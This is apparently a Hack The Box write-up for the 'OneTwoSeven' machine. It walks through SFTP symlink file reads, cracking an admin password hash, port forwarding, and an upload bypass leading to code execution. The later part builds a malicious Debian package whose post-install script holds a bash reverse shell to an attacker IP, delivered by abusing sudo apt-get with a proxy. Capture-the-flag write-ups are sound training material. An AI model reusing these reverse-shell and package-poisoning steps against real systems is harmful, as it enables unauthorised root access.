nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA)
|   256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA)
|_  256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Page moved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumerating port 80 (HTTP)

We have this website:

![image1](/assets/images/htb-onetwoseven/onetwoseven1.png)

This page has a free home page hoster let's see what it is

![image4](/assets/images/htb-onetwoseven/onetwoseven1.png)

### Enumerating SFTP

We have to connect with sftp with that credentials

```
sftp ots-3NDM4YTc@onetwoseven.htb
ots-3NDM4YTc@onetwoseven.htb's password: 
Connected to onetwoseven.htb.
sftp> ls
public_html  
sftp> cd public_html
sftp> ls -la
drwxr-xr-x    2 1001     1001         4096 Dec 16 09:37 .
drwxr-xr-x    3 0        0            4096 Dec 16 09:20 ..
-rw-r--r--    1 1001     1001          349 Feb 15  2019 index.html
```

Now I'll upload a file to test

```
sftp> put test.txt
Uploading test.txt to /public_html/test.txt
test.txt 
```

![image3](/assets/images/htb-onetwoseven/onetwoseven3.png)

And here's the file.

### Testing the symlink SFTP vulnerability

There's a vulnerability using symlinks on stfp, let's try to symlink  `/`

```
sftp> symlink / sym
```

And let's see it on the website

![image4](/assets/images/htb-onetwoseven/onetwoseven4.png)

We have only access to `var/`

Here I use symlink to see `/etc/passwd`

```
sftp> symlink /etc/passwd rrr
```

![image5](/assets/images/htb-onetwoseven/onetwoseven5.png)

In `/var` we have inside `www/` that have two directories: `html-admin/` and `html/`. Inside of `html-admin` there's `.login.php.swp` I'll download it and see what is there:

![image6](/assets/images/htb-onetwoseven/onetwoseven6.png)

![image7](/assets/images/htb-onetwoseven/onetwoseven7.png)

We have a login that test if the username is `ots-admin` and a hashed password, this page serves on port 60080. First I'll google the hash to see the password

![image8](/assets/images/htb-onetwoseven/onetwoseven8.png)

`Homesweethome1` is the password

### Port Forwarding to acess port 60080

We can't access to the webpage on the port 60080, so let's try to port forward over ssh even we haven't access to the shell

```
ssh -N -L 60080:127.0.0.1:60080 ots-3NDM4YTc@10.10.10.133
ots-3NDM4YTc@10.10.10.133's password:
```

We don't get anything back but let's see if we can access, and we can acess.

![image9](/assets/images/htb-onetwoseven/onetwoseven9.png)

And logging in with the credentials we have this:

![image10](/assets/images/htb-onetwoseven/onetwoseven10.png)

We have a plugin upload but we can't upload anything because the submit is disabled

### Uploading files

The submit queyr is disabled but, using the dev tools we find this:

![image11](/assets/images/htb-onetwoseven/onetwoseven11.png)

Remove the `disabled="disabled"` and then we can submit:

![image12](/assets/images/htb-onetwoseven/onetwoseven12.png)

Now let's submit a test file

![image13](/assets/images/htb-onetwoseven/onetwoseven13.png)

We get a 404 not found, looking at the source code of the addon manager we have this:

![image14](/assets/images/htb-onetwoseven/onetwoseven14.png)

To upload what we are going to do is add in the `url addon-download.php` and then the `addon-upload.php` to upload the file, the url would be like this: `/addond-download.php&/addon-upload.php` so when we send this request it only rewrites the download part and let us upload:

![image15](/assets/images/htb-onetwoseven/onetwoseven15.png)

Let's test it:

![image16](/assets/images/htb-onetwoseven/onetwoseven16.png)

And here is the file:

![image17](/assets/images/htb-onetwoseven/onetwoseven17.png)

Now I'll upload a file to get code execution

![image18](/assets/images/htb-onetwoseven/onetwoseven18.png)

![image19](/assets/images/htb-onetwoseven/onetwoseven19.png)

### Getting a reverese shell

Let's use this bash reverse shell:

![image20](/assets/images/htb-onetwoseven/onetwoseven20.png)

Set up a listener refresh the page and I get the connection back

### Enumerating privesc vectors

I run `sudo -l` and I find this:

```
sudo -l 
sudo -l
Matching Defaults entries for www-admin-data on onetwoseven:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-admin-data may run the following commands on onetwoseven:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

We can run `aptget update` and `apt-get upgrade` as root without password, and the `http_proxy` values won't reset, so what we are going to do is create and apt repository with a package with a reverse shell

First I'll set up proxy that redirects to the python serve

![image21](/assets/images/htb-onetwoseven/onetwoseven21.png)

![image22](/assets/images/htb-onetwoseven/onetwoseven22.png)

If we see thge content of `/etc/apt/sources.list.d/onetwoseven.list` we see that it retrieves the packages from `packages.onetwoseven.htb`

```
cat /etc/apt/sources.list.d/onetwoseven.list 
# OneTwoSeven special packages - not yet in use
deb http://packages.onetwoseven.htb/devuan ascii main
```

Add this to `/etc/hosts`

```
127.0.0.1       localhost       packages.onetwoseven.htb
```

Now I star the server with python

```
sudo python3 -m http.server 80
```

Now export the `http_proxy` to your server

```
export http_proxy="http://10.10.14.17:8181"
```

Now when we do `sudo apt-get update` we see that the box request files from our server, we see that it's requesting to the directory `devuan` let's make a directory with this name

Then we see that it want the packages from here:

```
"GET http://packages.onetwoseven.htb/devuan/dists/ascii/main/binary-amd64/Packages.gz
```

Create a directory with that name:

```
mkdir -p devuan/dists/ascii/main/binary-amd64
```

### Creating the malicious package

First we are going to see the http history and take the host

![image23](/assets/images/htb-onetwoseven/onetwoseven23.png)

![image24](/assets/images/htb-onetwoseven/onetwoseven24.png)

Download the package, and remove everyone except one:

![image25](/assets/images/htb-onetwoseven/onetwoseven25.png)

Now pick one package to update, I'll choose telnet

```
dpkg -l
---
---
ii  telnet         0.17-41      amd64        basic telnet client

---
---
```

And we change and I save:

![image26](/assets/images/htb-onetwoseven/onetwoseven26.png)

Now let's create the malicious package:

First create a directory named `DEBIAN`, then a file named `control` and its content:

```
Package: telnet
Maintainer: based
Version: 0.20-1
Architecture: amd64
Description: good description
```

Then a file named postint with the reverse shell

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.17/9002 0>&1'
```

```
chmod 755 postint
```

Now build it 

```
dpkg-deb --build telnet/
```

```
sha256sum telnet.deb 
aa62dadfa0a26bc9685ab3529e1d1f56bf52385e0e4e0d58e784d99d255bc71c  telnet.deb
```

Now put the size and the sha256 sum in the Packages file, now gzip the packages

```
gzip Packages
```

Next thing is going to be set up a listener

```
nc -lvnp 9002
```

Then in the box

```
sudo apt-get update
sudo apt-get upgrade
```

